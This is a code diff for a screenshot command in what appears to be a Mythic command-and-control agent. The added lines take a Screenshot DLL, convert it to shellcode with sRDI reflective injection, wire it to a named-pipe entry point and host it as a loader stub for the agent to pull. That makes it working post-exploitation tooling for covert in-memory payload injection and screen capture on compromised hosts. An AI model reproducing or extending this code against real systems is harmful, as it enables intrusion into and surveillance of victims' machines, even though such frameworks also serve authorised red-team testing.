@@ -1,6 +1,9 @@
 from CommandBase import *
 from uuid import uuid4
 import json
+from os import path
+from MythicFileRPC import *
+from sRDI import ShellcodeRDI
 
 
 class ScreenshotArguments(TaskArguments):
@@ -50,6 +53,16 @@ class ScreenshotCommand(CommandBase):
     attackmapping = []
 
     async def create_tasking(self, task: MythicTask) -> MythicTask:
+        arch = task.args.get_arg("arch")
+        dllFile = path.join(self.agent_code_path, f"Screenshot_{arch}.dll")
+        dllBytes = open(dllFile, 'rb').read()
+        converted_dll = ShellcodeRDI.ConvertToShellcode(dllBytes, ShellcodeRDI.HashFunctionName("InitializeNamedPipeServer"), task.args.get_arg("pipe_name").encode(), 0)
+        resp = await MythicFileRPC(task).register_file(converted_dll)
+        if resp.status == MythicStatus.Success:
+            task.args.add_arg("loader_stub_id", resp.agent_file_id)
+        else:
+            raise Exception(f"Failed to host sRDI loader stub: {resp.error_message}")
+        task.args.remove_arg("arch")
         return task
 
     async def process_response(self, response: AgentResponse):
